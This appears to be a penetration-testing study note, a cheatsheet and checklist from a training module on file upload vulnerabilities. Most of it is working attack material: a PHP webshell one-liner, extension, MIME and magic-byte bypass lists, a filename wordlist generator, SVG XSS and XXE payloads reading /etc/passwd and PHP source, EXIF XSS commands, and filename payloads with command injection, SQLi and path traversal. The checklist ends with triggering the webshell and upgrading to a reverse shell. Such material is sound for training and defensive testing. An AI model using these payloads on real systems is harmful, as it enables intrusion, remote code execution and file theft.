---
title: Cheatsheet & Checklist
tags: [module]
---

## Cheatsheet

### PHP Webshell One-Liner
```php
<?php system($_GET['c']); ?>
```

### Alternate PHP Extensions to Fuzz
```
.php, .phtml, .phar, .php3, .php4, .php5, .php7, .pht, .phps, .pHp, .PHP
```

### ASP / ASPX Extensions
```
.asp, .aspx, .ashx, .asmx, .cer, .asa, .cshtml
```

### JSP Extensions
```
.jsp, .jspx, .jsw, .jsv, .jspf
```

### Fake Magic Bytes
```
GIF8;                           # GIF — easiest, printable ASCII
\x89PNG\r\n\x1a\n               # PNG (binary)
\xFF\xD8\xFF\xE0                # JPEG (binary)
%PDF-1.4                        # PDF
```

### Double Extension Permutations
```
shell.php.jpg         # unanchored regex bypass
shell.jpg.php         # trailing-extension handler bypass
shell.phar.jpg
shell.jpeg.phar
shell.pHp.jpg         # case bypass
```

### Character Injection Wordlist Generator
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
  for ext in '.php' '.phps' '.phar'; do
    echo "shell$char$ext.jpg"       >> wordlist.txt
    echo "shell$ext$char.jpg"       >> wordlist.txt
    echo "shell.jpg$char$ext"       >> wordlist.txt
    echo "shell.jpg$ext$char"       >> wordlist.txt
  done
done
```

### SVG XSS Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <script type="text/javascript">alert(window.origin)</script>
</svg>
```

### SVG XXE — Read Local File
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### SVG XXE — Read PHP Source (base64)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### EXIF Metadata XSS Injection
```bash
exiftool -Artist='"><script>alert(1)</script>' profile.jpg
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

### Filename Payloads
```
file$(whoami).jpg                         # OS command injection
file`whoami`.jpg                          # OS command injection (backticks)
file.jpg||whoami                          # OS command injection (shell operator)
<script>alert(1)</script>.jpg             # filename XSS
file';SELECT+SLEEP(5);--.jpg              # filename SQLi
../../../etc/passwd                       # path traversal filename
```

### Windows Tricks
```
WEB~1.CON       # 8.3 short-name targeting web.conf
CON             # reserved device name — forces error
shell.aspx:.png # NTFS alternate data stream
```

### Content-Type Header Swap (in Burp)
```http
Content-Disposition: form-data; name="file"; filename="shell.phar"
Content-Type: image/png
```

### Common Upload Paths to Fuzz
```
/uploads/
/upload/
/files/
/images/
/media/
/avatars/
/user/<id>/
```

### Useful Wordlists
```
SecLists/Discovery/Web-Content/web-all-content-types.txt
SecLists/Fuzzing/UploadFileExtensions.txt
```

## Checklist

### Recon the Upload Function
- [ ] Identify every file upload endpoint in the application
- [ ] Note the stated allowed file types (from UI hints, help text, error messages)
- [ ] Determine if validation is client-side only (upload without any network request → client-side)
- [ ] Capture a successful upload in Burp and study the request (multipart boundaries, headers)
- [ ] Note any URL or path returned after upload that indicates where files are stored

### Client-Side Filter Bypass
- [ ] Try selecting a disallowed file — does any request reach the server?
- [ ] Open DevTools, locate the JS validation function, disable or delete it
- [ ] Alternatively, upload an allowed file and modify the request in Burp (swap filename and body)

### Blacklist Extension Bypass
- [ ] Upload `shell.php` and record the exact error message
- [ ] Send the request to Burp Intruder, fuzz extension field with PHP-equivalent list
- [ ] Uncheck URL-encoding in Intruder payload settings
- [ ] Identify extensions receiving a different response (size or status)
- [ ] Verify each allowed extension actually executes PHP (upload `<?php echo "x"; ?>`)
- [ ] Try case-toggled variants (`.pHp`, `.Php`, `.PhAr`)

### Whitelist Extension Bypass
- [ ] Try double extension: `shell.php.jpg`
- [ ] Try reverse double extension: `shell.jpg.php`
- [ ] Try reverse with alternate PHP extension: `shell.jpeg.phar`
- [ ] Try character injection permutations (null byte, `%20`, `:`, `.\`, trailing `.`)

### MIME / Content-Type Filter Bypass
- [ ] In Burp, change the file's `Content-Type` to `image/png` or `image/gif`
- [ ] Also test changing the request's top-level `Content-Type` header
- [ ] Prepend valid magic bytes to the payload (`GIF8` easiest ASCII spoof)
- [ ] Combine: valid magic bytes + spoofed Content-Type + allowed extension
- [ ] If filter is strict, append payload at the END of a valid image (bypass head-only inspection)

### Limited Upload Exploitation
- [ ] If HTML allowed: upload with embedded `<script>` for stored XSS
- [ ] If SVG allowed: upload SVG with `<script>` for stored XSS
- [ ] If SVG allowed: upload SVG with XXE payload targeting `/etc/passwd`
- [ ] If SVG XXE confirmed: extract app source via `php://filter` base64 encoding
- [ ] If image metadata is displayed: inject XSS via `exiftool -Artist` or `-Comment`

### Filename Attack Surface
- [ ] Try filename command injection: `file$(whoami).jpg`
- [ ] Try filename XSS: `<script>alert(1)</script>.jpg`
- [ ] Try filename SQLi: `file';SELECT+SLEEP(5);--.jpg`
- [ ] Windows targets: test reserved names (`CON`, `COM1`) and 8.3 short names

### Post-Upload / RCE
- [ ] Locate where files are stored (fuzz `/uploads/`, `/files/`, `/media/`)
- [ ] If directory listing works, browse for your shell
- [ ] Otherwise use the filename or ID returned by the upload response
- [ ] Trigger the shell: `GET /uploads/shell.phar?c=id`
- [ ] Upgrade to reverse shell once RCE is confirmed

### Advanced / Defense-In-Depth
- [ ] Test oversized files, duplicate filenames, 5000-char filenames for path disclosure
- [ ] Test decompression bomb if the app auto-unzips uploads
- [ ] Check if uploads are served with `Content-Disposition: attachment`
- [ ] Research the image-processing library (ffmpeg, ImageMagick) for known CVEs
